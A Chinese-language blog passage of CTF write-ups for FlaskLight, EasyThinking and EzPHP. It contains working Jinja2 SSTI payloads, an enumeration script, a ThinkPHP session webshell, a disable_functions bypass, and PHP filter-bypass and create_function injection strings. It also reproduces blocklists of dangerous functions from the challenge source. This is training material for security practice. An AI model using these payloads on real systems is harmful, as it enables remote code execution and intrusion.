Qual]FlaskLight</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072018649.png" alt="image-20240324213651066"></p><p>发现源码中有提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: GET --&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"> *#通过回显判断SSTI*</span><br></code></pre></td></tr></table></figure><p>尝试ssti注入，经过测试判断为jinja2</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#爆出所有类</span><br></code></pre></td></tr></table></figure><p>脚本查找可利用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">import</span> time<br><br>index = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">170</span>, <span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">try</span>:<br>        url = <span class="hljs-string">&quot;http://17ad255a-204e-4624-b878-e3e0d62e526a.node3.buuoj.cn/?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]&#125;&#125;&quot;</span><br>        r = requests.get(url)<br>        res = re.findall(<span class="hljs-string">&quot;&lt;h2&gt;You searched for:&lt;\/h2&gt;\W+&lt;h3&gt;(.*)&lt;\/h3&gt;&quot;</span>, r.text)<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-comment"># print(res)</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        res = html.unescape(res[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot; | &quot;</span> + res)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;subprocess.Popen&quot;</span> <span class="hljs-keyword">in</span> res:<br>            index = i<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;indexo of subprocess.Popen:&quot;</span> + <span class="hljs-built_in">str</span>(index))<br><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload:</span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /flasklight&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>测试发现网页框架thinkphp v6.0.0</p><p><em>主要考察ThinkPHP6.0的一个任意文件写入的CVE以及突破disable_function的方法。</em></p><p>使用dirsearch扫出来<a href="http://www.zip/">www.zip</a></p><p>下载下来看源码目录</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404252111710.png" alt="img"></p><p>在web&#x2F;home&#x2F;controller有一个Member.php，得到网页源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><brspan class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072038303.png" alt="image-20240407203813258"></p><p>访问shell路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/runtime/</span>session/sess_1234567890123456789012345678.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072036189.png" alt="image-20240407203629107"></p><p>有disable_function限制</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072040472.png" alt="image-20240407204037366"></p><p><a href="https://github.com/mm0r1/exploits/tree/master">disable_function绕过exp</a></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072047596.png" alt="image-20240407204718527"></p><p>猜测执行readflag得到flag</p><p>连接蚁剑，找个能上传文件的地方，上传exp，上传到&#x2F;var&#x2F;tmp&#x2F;目录当中</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072048531.png" alt="image-20240407204854466"></p><p>include包含</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404072053818.png" alt="image-20240407205302721"></p><p>法二：</p><p>利用蚁剑disabled_functions插件获取flag</p><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>1.$_SERVER[‘QUERY_STRING’]绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>几乎ban掉了所有可能使用的词</p><p>$_SERVER[‘QUERY_STRING’]函数不对传入的东西进行url编码，所以把payload进行url编码之后传入即可绕过</p><p>解决办法<a href="https://blog.csdn.net/qq_41814777/article/details/102058889">https://blog.csdn.net/qq_41814777/article/details/102058889</a>)</p><p>小葵转换工具</p><p><strong>2.preg_match绕过</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br><span class="hljs-regexp">//</span>不能包含http|https<br>&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>])&amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>)<br> <span class="hljs-regexp">//</span>需要在debu=xxx中匹配到‘<span class="hljs-regexp">/^&amp;/</span>’，且debu不能为‘aqua_is_cute’<br>    &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <span class="hljs-regexp">//</span>用file=xxx传值<br>        echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> die(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>‘&#x2F;^$&#x2F;‘是正则匹配，^表示以xxx开头，$表示以xxx结尾，现在需要绕过preg_match，所以在dedu&#x3D;aqua_is_cute末尾加上换行（也就是加上%0a）</p><p><strong>3.$_REQUEST绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>)) <br>        <span class="hljs-comment">//要求不能有字母</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$_POST优先级高于$_GET,所以用POST传入的值会把$_GET中的值覆盖掉<br></code></pre></td></tr></table></figure><p>1和2中可知，需要用file和debu传值，所以此处用POST传入file&#x3D;xxx&amp;debu&#x3D;xxx可以绕过(xxx可以是任何不为0的数)</p><p><strong>4.file_get_contents绕过</strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(file_get_contents($file)</span> !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    die<span class="hljs-comment">(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;)</span>;<br></code></pre></td></tr></table></figure><p>此处用data伪协议即可绕过（data:&#x2F;&#x2F;text&#x2F;plain,~）</p><p><strong>5.sha1函数、比较类型数组绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )<br><span class="hljs-comment">//既要shana和passwd传入的值不相同，又要这两个传入的值经过sha1散列之后强相等</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>sha1函数对数组不敏感，所以用shana[]&#x3D;1&amp;passwd[]&#x3D;2绕过</p><p>payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">file</span>=data://text/plain,debu_debu_aque<span class="hljs-variable">&amp;debu</span>=aque_is_cute%0a<span class="hljs-variable">&amp;shana</span>[]=1<span class="hljs-variable">&amp;passwd</span>[]=2<br></code></pre></td></tr></table></figure><p>url编码之后：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">file</span>=%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%<span class="hljs-number">73</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>同时POST传入file&#x3D;1&amp;debu&#x3D;1</p><p><strong>6.create_function运用</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||<span class="hljs-string"> </span><br><span class="hljs-string">preg_match(&#x27;/fil</span>|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) </span><br><span class="hljs-string">//ban了这么这么多，肯定不能用一般方法传入payload了</span><br><span class="hljs-string">&#123; </span><br><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="hljs-string">&#125; else &#123; </span><br><span class="hljs-string">    include &quot;flag.php&quot;;//包含了flag.php这个文件</span><br><span class="hljs-string">    $code(&#x27;&#x27;, $arg);</span><br><span class="hljs-string">&#125; ?&gt;</span><br></code></pre></td></tr></table></figure><p>由<code>extract($_GET[&quot;flag&quot;]);</code>知code和arg是可更改变量</p><p>extract函数会注册变量，可以用来覆盖$code或$arg。</p><p>使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即<code>flag[code]</code>和<code>flag[arg]</code>的形式</p><p>利用create_function,对于</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$aaa</span> = create_function(<span class="hljs-string">&#x27;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>&#x27;</span>, <span class="hljs-string">&#x27;return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aaa</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;  <br></code></pre></td></tr></table></figure><p>对于</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$code</span>=return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;&#125;fction();<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>相当于</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">function</span> aaa(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>)&#123;<br>    return <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>&#125;  <br>fction();<span class="hljs-regexp">//</span>&#125;（fction为某个任意函数，<span class="hljs-string">&quot;//&quot;</span>可以注释掉后面的内容）<br></code></pre></td></tr></table></figure><p>应用到本题,可以得到</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-built_in">flag</span>[code]=create_function&amp;<span class="hljs-built_in">flag</span>[arg]=&#125;fction();<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>利用<code>get_defined_vars()</code>将所有变量和值都进行输出</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">flag<span class="hljs-literal">[<span class="hljs-identifier">code</span>]</span>=create_function&amp;flag<span class="hljs-literal">[<span class="hljs-identifier">arg</span>]</span>=&#125;var<span class="hljs-constructor">_dump(<span class="hljs-params">get_defined_vars</span>()</span>);<span 